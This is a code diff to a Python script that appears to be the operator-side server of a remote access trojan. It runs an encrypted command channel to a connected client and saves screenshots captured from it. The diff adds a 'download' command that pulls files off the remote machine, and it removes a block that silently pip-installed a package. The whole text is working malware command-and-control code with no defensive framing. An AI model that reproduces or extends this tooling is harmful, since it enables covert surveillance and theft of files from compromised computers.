@@ -1,21 +1,12 @@
 #!/usr/bin/env python3
 
-import socket, argparse, os, readline
+import socket, argparse, os
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.backends import default_backend
 import datetime, subprocess
-
-try:
-    import readline
-except ImportError:
-    try:
-        import pyreadline as readline
-    except ImportError:
-        subprocess.run(["pip", "install", "pyreadline"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
-        import pyreadline as readline
 
 def aes_encrypt(data, key):
     aesgcm = AESGCM(key)
@@ -120,6 +111,23 @@ def start_server(ip, port):
                         screenshot_file.write(screenshot_data)
                     print(f"Screenshot saved as '{filename}'")
                     screenshot_counter += 1
+            elif command.startswith("download"):
+                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
+                client_socket.send(encrypted_command)
+                files_downloaded = 0
+                while True:
+                    encrypted_filename = receive_with_size(client_socket)
+                    if not encrypted_filename:
+                        break
+                    filename = aes_decrypt(encrypted_filename, key).decode('utf-8')
+                    print(f"[-] Downloading {filename}")
+                    encrypted_content = receive_with_size(client_socket)
+                    content = aes_decrypt(encrypted_content, key)
+                    with open(filename, "wb") as f:
+                        f.write(content)
+                    files_downloaded += 1
+                if files_downloaded > 0:
+                    print("[+] File(s) downloaded")
             else:
                 encrypted_command = aes_encrypt(command.encode('utf-8'), key)
                 client_socket.send(encrypted_command)
